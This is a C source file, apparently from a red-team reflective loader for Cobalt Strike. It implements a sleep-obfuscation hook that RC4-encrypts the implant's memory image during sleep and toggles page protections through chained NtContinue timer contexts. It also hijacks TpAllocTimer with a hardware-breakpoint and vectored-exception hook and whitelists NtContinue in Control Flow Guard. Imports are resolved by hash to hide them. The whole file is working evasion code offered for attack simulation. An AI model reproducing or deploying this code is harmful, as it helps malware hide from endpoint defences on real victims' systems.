/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

#if defined( _WIN64 )

NTSTATUS
NTAPI
RtlCreateTimerQueue(
	_In_ PHANDLE NewTimerQueue
);

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING, *PUSTRING ;

NTSTATUS
NTAPI
SystemFunction032(
	_In_ PUSTRING Buffer,
	_In_ PUSTRING Key
);

typedef struct
{
	D_API( CloseThreadpoolCleanupGroupMembers );
	D_API( RtlRemoveVectoredExceptionHandler );
	D_API( NtSignalAndWaitForSingleObject );
	D_API( RtlAddVectoredExceptionHandler );
	D_API( CreateThreadpoolCleanupGroup );
	D_API( SetProcessValidCallTargets );
	D_API( SetThreadpoolThreadMaximum );
	D_API( SetThreadpoolThreadMinimum );
	D_API( LdrGetProcedureAddress );
	D_API( WaitForSingleObjectEx );
	D_API( NtWaitForSingleObject );
	D_API( RtlInitUnicodeString );
	D_API( RtlCreateTimerQueue );
	D_API( RtlDeleteTimerQueue );
	D_API( NtGetContextThread );
	D_API( NtSetContextThread );
	D_API( SystemFunction032 );
	D_API( RtlCaptureContext );
	D_API( RtlInitAnsiString );
	D_API( CreateThreadpool );
	D_API( CloseThreadpool );
	D_API( RtlAllocateHeap );
	D_API( VirtualProtect );
	D_API( RtlCreateTimer );
	D_API( NtCreateEvent );
	D_API( LdrUnloadDll );
	D_API( RtlFreeHeap );
	D_API( LdrLoadDll );
	D_API( NtContinue );
	D_API( SetEvent );
	D_API( NtClose );
} API ;

/* API Hashes */
#define H_API_RTLREMOVEVECTOREDEXCEPTIONHANDLER	0xad1b018e /* RtlRemoveVectoredExceptionHandler */
#define H_API_RTLADDVECTOREDEXCEPTIONHANDLER	0x2df06c89 /* RtlAddVectoredExceptionHandler */
#define H_API_NTSIGNALANDWAITFORSINGLEOBJECT	0x78983aed /* NtSignalAndWaitForSingleObject */
#define H_API_SETPROCESSVALIDCALLTARGETS	0x647d9236 /* SetProcessValidCallTargets */
#define H_API_LDRGETPROCEDUREADDRESS		0xfce76bb6 /* LdrGetProcedureAddress */
#define H_API_NTWAITFORSINGLEOBJECT		0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_RTLINITUNICODESTRING		0xef52b589 /* RtlInitUnicodeString */
#define H_API_RTLCREATETIMERQUEUE		0x50ef3c31 /* RtlCreateTimerQueue */
#define H_API_RTLDELETETIMERQUEUE		0xeec188b0 /* RtlDeleteTimerQueue */
#define H_API_WAITFORSINGLEOBJECT		0x0df1b3da /* WaitForSingleObject */
#define H_API_NTGETCONTEXTTHREAD		0x6d22f884 /* NtGetContextThread */
#define H_API_NTSETCONTEXTTHREAD		0xffa0bf10 /* NtSetContextThread */
#define H_API_RTLCAPTURECONTEXT			0xeba8d910 /* RtlCaptureContext */
#define H_API_RTLINITANSISTRING			0xa0c8436d /* RtlInitAnsiString */
#define H_API_RTLALLOCATEHEAP			0x3be94c5a /* RtlAllocateHeap */
#define H_API_RTLCREATETIMER			0x1877faec /* RtlCreateTimer */
#define H_API_NTCREATEEVENT			0x28d3233d /* NtCreateEvent */
#define H_API_LDRUNLOADDLL			0xd995c1e6 /* LdrUnloadDll */
#define H_API_RTLFREEHEAP			0x73a9e4d7 /* RtlFreeHeap */
#define H_API_LDRLOADDLL			0x9e456a43 /* LdrLoadDll */
#define H_API_NTCONTINUE			0xfc3a6c2c /* NtContinue */
#define H_API_SETEVENT				0x9d7ff713 /* SetEvent */
#define H_API_NTCLOSE				0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_KERNELBASE			0x03ebb38b /* kernelbase.dll */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/* STR Hashes */
#define H_STR_TPALLOCTIMER			0x383d6995 /* TpAllocTimer */

/*!
 *
 * Purpose:
 *
 * Enables a debug breakpoint at the specified addr.
 * Uses DR3 to trigger the breakpoint without issue.
 *
!*/
D_SEC( D ) VOID EnableBreakpoint( _In_ PVOID Addr )
{
	API		Api;
	CONTEXT		Ctx;

	ULONG_PTR	Bit = 0;
	ULONG_PTR	Msk = 0;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	Api.NtGetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );

	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	Api.NtGetContextThread( NtCurrentThread(), &Ctx );

	/* Set DR3 to the specified address */
	Ctx.Dr3 = U_PTR( Addr );

	/* Sets DR0-DR3 for HWBP */
	Msk = ( 1UL << 16 ) - 1UL;
	Bit = ( Ctx.Dr7 &~ ( Msk << 16 ) ) | ( 0 << 16 );
	Ctx.Dr7 = U_PTR( Bit );

	/* Sets DR3 as enabled */
	Msk = ( 1UL << 1 ) - 1UL;
	Bit = ( Ctx.Dr7 &~ ( Msk << 6 ) ) | ( 1 << 6 );
	Ctx.Dr7 = U_PTR( Bit );
	Ctx.Dr6 = U_PTR( 0 );

	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	Api.NtSetContextThread( NtCurrentThread(), &Ctx );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
};

/*!
 *
 * Purpose:
 *
 * Disables DR3 debug register 
 *
!*/

D_SEC( D ) VOID RemoveBreakpoint( _In_ PVOID Addr )
{
	API		Api;
	CONTEXT		Ctx;

	ULONG_PTR	Msk = 0;
	ULONG_PTR	Bit = 0;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );

	Api.NtGetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );

	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	Api.NtGetContextThread( NtCurrentThread(), &Ctx );

	/* Disables the DR3 local mode! */
	Msk = ( 1ULL << 1 ) - 1UL;
	Bit = ( Ctx.Dr7 &~ ( Msk << 6 ) ) | ( 0 << 6 );
	Ctx.Dr7 = U_PTR( Bit );
	Ctx.Dr6 = U_PTR( 0 );
	Ctx.Dr3 = U_PTR( 0 );
	Ctx.EFlags = Ctx.EFlags &~ 0x100;

	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	Api.NtSetContextThread( NtCurrentThread(), &Ctx );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
};

/*!
 *
 * Purpose:
 *
 * Modifies TpAllocTimer to use a custom thread pool. Inteded to
 * act as a hook for the call RtlCreateTimer and redirected to
 * with a VEH debugger.
 *
!*/
D_SEC( D ) NTSTATUS NTAPI TpAllocTimerHook( _Out_ PTP_TIMER *Timer, _In_ PTP_TIMER_CALLBACK Callback, _Inout_opt_ PVOID Context, _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron ) 
{
	PTABLE		Tbl = NULL;
	NTSTATUS 	Ret = STATUS_SUCCESS;

	/* Get a pointer to Table */
	Tbl = C_PTR( G_SYM( Table ) );

	/* Remove a breakpoint on the ntdll!TpAllocTimer  */
	RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );

	/* Execute TpAllocTimer and swap CallbackEnviron with a replacement */
	Ret = ( ( __typeof__( TpAllocTimerHook ) * ) PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) )(
		Timer, Callback, Context, & Tbl->Table->Debugger.PoolEnv

	);

	/* Enables a breakpoint on the ntdll!TpAllocTimer */
	EnableBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );

	/* Return */
	return Ret;
};

/*!
 *
 * Purpose:
 *
 * Simple VEH-based debugger that will attempt to redirect all
 * calls to TpAllocWork to a hooked version which will insert
 * our custom thread pool.
 *
!*/
D_SEC( D ) LONG WINAPI VehDebugger( _In_ PEXCEPTION_POINTERS ExceptionIf )
{
	DWORD	Ret = 0;
	PTABLE	Tbl = NULL;

	Tbl = C_PTR( G_SYM( Table ) );

	/* Is the thread where our debugger comes from ? */
	if ( Tbl->Table->ClientId.UniqueThread == NtCurrentTeb()->ClientId.UniqueThread ) {
		if ( ExceptionIf->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ) {
			if ( U_PTR( ExceptionIf->ExceptionRecord->ExceptionAddress ) == U_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) ) {
				/* Redirect TpAllocTimer -> TpAllocTimerHook */
				ExceptionIf->ContextRecord->Rip = U_PTR( G_SYM( TpAllocTimerHook ) );
			};
			/* Notify! */
			Ret = EXCEPTION_CONTINUE_EXECUTION;
		};

		/* Return */
		return Ret;
	};

	/* Pretty much ignore all other exceptions! */
	return EXCEPTION_CONTINUE_SEARCH;
};

/*!
 *
 * Purpose:
 *
 * Adds a ROP gadget to the CFG exception lsit to
 * permit ROP gadgets from being marked as an
 * invalid target.
 *
!*/
D_SEC( D ) VOID CfgEnableFunc( _In_ PVOID ImageBase, _In_ PVOID Function )
{
	API			Api;
	CFG_CALL_TARGET_INFO	Cfg;

	SIZE_T			Len = 0;

	PVOID			Kbs = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cfg, sizeof( Cfg ) );

	Dos = C_PTR( ImageBase );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Len = U_PTR( ( Nth->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );

	if ( ( Kbs = PebGetModule( H_LIB_KERNELBASE ) ) != NULL ) {
		Api.SetProcessValidCallTargets = PeGetFuncEat( Kbs, H_API_SETPROCESSVALIDCALLTARGETS );

		if ( Api.SetProcessValidCallTargets != NULL ) {
			Cfg.Flags  = CFG_CALL_TARGET_VALID;
			Cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );

			Api.SetProcessValidCallTargets( NtCurrentProcess(), Dos, Len, 1, &Cfg );
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cfg, sizeof( Cfg ) );
};

/*!
 *
 * Purpose:
 *
 * Uses NightHawk's Obfuscate/Sleep implementation to
 * hide traces of Cobalt Strike in memory. Temporary 
 * version, limited to x86_64 currently.
 *
!*/
D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
{
	API			Api;
	UCHAR			Rnd[ 16 ];
	USTRING			Key;
	USTRING			Buf;
	CONTEXT			Ctx;
	ANSI_STRING		Ani;
	UNICODE_STRING		Uni;

	DWORD			Prt = 0;
	DWORD			Del = 0;
	SIZE_T			XLn = 0;
	SIZE_T			FLn = 0;

	PVOID			Veh = NULL;
	PVOID			Ev1 = NULL;
	PVOID			Ev2 = NULL;
	PVOID			Ev3 = NULL;
	PVOID			K32 = NULL;
	PVOID			Adv = NULL;
	PVOID			Tmr = NULL;
	PVOID			Que = NULL;
	PVOID			Img = NULL;

	PVOID			Cln = NULL;
	PVOID			Pol = NULL;
	
	PTABLE			Tbl = NULL;
	PCONTEXT		Beg = NULL;
	PCONTEXT		Set = NULL;
	PCONTEXT		Enc = NULL;
	PCONTEXT		Blk = NULL;
	PCONTEXT		Dec = NULL;
	PCONTEXT		Res = NULL;
	PCONTEXT		End = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Rnd, sizeof( Rnd ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	Api.RtlRemoveVectoredExceptionHandler = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREMOVEVECTOREDEXCEPTIONHANDLER ); 
	Api.RtlAddVectoredExceptionHandler    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLADDVECTOREDEXCEPTIONHANDLER );
	Api.NtSignalAndWaitForSingleObject    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSIGNALANDWAITFORSINGLEOBJECT );
	Api.LdrGetProcedureAddress            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
	Api.NtWaitForSingleObject             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlInitUnicodeString              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING ); 
	Api.RtlCreateTimerQueue               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMERQUEUE );
	Api.RtlDeleteTimerQueue               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLDELETETIMERQUEUE );
	Api.NtGetContextThread                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtSetContextThread                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
	Api.RtlCaptureContext                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
	Api.RtlInitAnsiString                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
	Api.RtlAllocateHeap                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlCreateTimer                    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATETIMER );
	Api.NtCreateEvent                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
	Api.LdrUnloadDll                      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlFreeHeap                       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.LdrLoadDll                        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
	Api.NtContinue                        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );
	Api.NtClose                           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	/* Load kernel32.dll if it somehow isnt already! */
	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"kernel32.dll" ) ) );
	
	if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &K32 ) ) ) {

		Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"advapi32.dll" ) ) );

		if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &Adv ) ) ) {

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CloseThreadpoolCleanupGroupMembers" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CloseThreadpoolCleanupGroupMembers );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CreateThreadpoolCleanupGroup" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CreateThreadpoolCleanupGroup );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SetThreadpoolThreadMaximum" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SetThreadpoolThreadMaximum );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SetThreadpoolThreadMinimum" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SetThreadpoolThreadMinimum );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "WaitForSingleObjectEx" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.WaitForSingleObjectEx );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SystemFunction032" ) ) );
			Api.LdrGetProcedureAddress( Adv, &Ani, 0, &Api.SystemFunction032 );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CreateThreadpool" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CreateThreadpool );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "CloseThreadpool" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.CloseThreadpool );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "VirtualProtect" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.VirtualProtect );

			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SetEvent" ) ) );
			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SetEvent );

			Tbl = C_PTR( G_SYM( Table ) );
			Img = C_PTR( Tbl->Table->RxBuffer );
			XLn = U_PTR( Tbl->Table->RxLength );
			FLn = U_PTR( Tbl->Table->ImageLength );

			RandomString( &Rnd, sizeof( Rnd ) );

			Key.Buffer = C_PTR( &Rnd );
			Key.Length = Key.MaximumLength = sizeof( Rnd );

			Buf.Buffer = C_PTR( Tbl->Table->RxBuffer );
			Buf.Length = Buf.MaximumLength = Tbl->Table->ImageLength;

			do {
				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev1, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
					/* Abort! */
					break;
				};
				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev2, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
					/* Abort! */
					break;
				};
				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev3, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
					/* Abort! */
					break;
				};

				/* Add an exception handler to handle hooking. */
				if ( ! ( Veh = Api.RtlAddVectoredExceptionHandler( 1, C_PTR( G_SYM( VehDebugger ) ) ) ) ) {
					/* Abort! */
					break;
				};

				/* Initialize the thread pool environment */
				InitializeThreadpoolEnvironment( &Tbl->Table->Debugger.PoolEnv );

				if ( !( Pol = Api.CreateThreadpool( NULL ) ) ) {
					/* Abort! */
					break;
				};

				if ( !( Cln = Api.CreateThreadpoolCleanupGroup() ) ) {
					/* Abort! */
					break;
				};

				/* Initialize the 'pool' that the timer will use */
				Api.SetThreadpoolThreadMaximum( Pol, 1 );
				Api.SetThreadpoolThreadMinimum( Pol, 1 );
				SetThreadpoolCallbackPool( & Tbl->Table->Debugger.PoolEnv, Pol );
				SetThreadpoolCallbackCleanupGroup( & Tbl->Table->Debugger.PoolEnv, Cln, NULL );

				/* Add breakpoint on ntdll!TpAllocTimer */
				EnableBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );

				if ( NT_SUCCESS( Api.RtlCreateTimerQueue( &Que ) ) ) {

					Ctx.ContextFlags = CONTEXT_FULL;

					if ( NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.RtlCaptureContext, &Ctx, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
						if ( NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.SetEvent, Ev1, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
							if ( NT_SUCCESS( Api.NtWaitForSingleObject( Ev1, FALSE, NULL ) ) ) {
								if ( !( Beg = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( Set = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( Enc = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( Blk = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( Dec = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) { 
									/* Abort! */
									break;
								};
								if ( !( Res = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};
								if ( !( End = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
									/* Abort! */
									break;
								};

								CfgEnableFunc( PebGetModule( H_LIB_NTDLL ), Api.NtContinue );

								__builtin_memcpy( Beg, &Ctx, sizeof( CONTEXT ) );
								Beg->ContextFlags = CONTEXT_FULL;
								Beg->Rip  = U_PTR( Api.WaitForSingleObjectEx );
								Beg->Rsp -= sizeof( PVOID );
								Beg->Rcx  = U_PTR( Ev2 );
								Beg->Rdx  = U_PTR( INFINITE );
								Beg->R8   = U_PTR( FALSE );

								__builtin_memcpy( Set, &Ctx, sizeof( CONTEXT ) );
								Set->ContextFlags = CONTEXT_FULL;
								Set->Rip  = U_PTR( Api.VirtualProtect );
								Set->Rsp -= sizeof( PVOID );
								Set->Rcx  = U_PTR( Img );
								Set->Rdx  = U_PTR( XLn );
								Set->R8   = U_PTR( PAGE_READWRITE );
								Set->R9   = U_PTR( &Prt );

								__builtin_memcpy( Enc, &Ctx, sizeof( CONTEXT ) );
								Enc->ContextFlags = CONTEXT_FULL;
								Enc->Rip  = U_PTR( Api.SystemFunction032 );
								Enc->Rsp -= sizeof( PVOID );
								Enc->Rcx  = U_PTR( &Buf );
								Enc->Rdx  = U_PTR( &Key );

								__builtin_memcpy( Blk, &Ctx, sizeof( CONTEXT ) );
								Blk->ContextFlags = CONTEXT_FULL;
								Blk->Rip  = U_PTR( Api.WaitForSingleObjectEx );
								Blk->Rsp -= sizeof( PVOID );
								Blk->Rcx  = U_PTR( Ev3 );
								Blk->Rdx  = U_PTR( DelayTime );
								Blk->R8   = U_PTR( FALSE );

								__builtin_memcpy( Dec, &Ctx, sizeof( CONTEXT ) );
								Dec->ContextFlags = CONTEXT_FULL;
								Dec->Rip  = U_PTR( Api.SystemFunction032 );
								Dec->Rsp -= sizeof( PVOID );
								Dec->Rcx  = U_PTR( &Buf );
								Dec->Rdx  = U_PTR( &Key );

								__builtin_memcpy( Res, &Ctx, sizeof( CONTEXT ) );
								Res->ContextFlags = CONTEXT_FULL;
								Res->Rip  = U_PTR( Api.VirtualProtect );
								Res->Rsp -= sizeof( PVOID );
								Res->Rcx  = U_PTR( Img );
								Res->Rdx  = U_PTR( XLn );
								Res->R8   = U_PTR( PAGE_EXECUTE_READ );
								Res->R9   = U_PTR( &Prt );

								__builtin_memcpy( End, &Ctx, sizeof( CONTEXT ) );
								End->ContextFlags = CONTEXT_FULL;
								End->Rip  = U_PTR( Api.SetEvent );
								End->Rsp -= sizeof( PVOID );
								End->Rcx  = U_PTR( Ev3 );

								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Beg, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Set, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Enc, Api.NtContinue, Enc, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Blk, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Dec, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, Res, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, End, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;

								/* Remove the breakpoint on ntdll!TpAllocTimer */
								RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );

								/* Remove the Vectored Exception Handler! */
								if ( Api.RtlRemoveVectoredExceptionHandler( Veh ) ) {
									/* Execute and await the frame results! */
									Api.NtSignalAndWaitForSingleObject( Ev2, Ev3, FALSE, NULL ); 
								};
							};
						};
					};
				};
			} while ( 0 );

			if ( Ev1 != NULL ) {
				Api.NtClose( Ev1 );
			};
			if ( Ev2 != NULL ) {
				Api.NtClose( Ev2 );
			};
			if ( Ev3 != NULL ) {
				Api.NtClose( Ev3 );
			};
			if ( Que != NULL ) {
				Api.RtlDeleteTimerQueue( Que ); 
			};
			if ( Beg != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Beg );
			};
			if ( Set != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Set );
			};
			if ( Enc != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Enc );
			};
			if ( Blk != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Blk );
			};
			if ( Dec != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Dec );
			};
			if ( Res != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Res );
			};
			if ( End != NULL ) {
				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, End );
			};
			if ( Veh != NULL ) {
				/* Remove the breakpoint on ntdll!TpAllocTimer */
				RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );

				/* Remove the Vectored Exception Handler */
				Api.RtlRemoveVectoredExceptionHandler( Veh );
			};
			if ( Cln != NULL ) {
				/* Close the thread pool cleanup */
				Api.CloseThreadpoolCleanupGroupMembers( Cln, TRUE, NULL ); 
			};
			if ( Pol != NULL ) {
				/* Close the pool */
				Api.CloseThreadpool( Pol );
			};

			/* Dereference */
			Api.LdrUnloadDll( Adv );
		};

		/* Dereference */
		Api.LdrUnloadDll( K32 );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Rnd, sizeof( Rnd ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
};

#endif
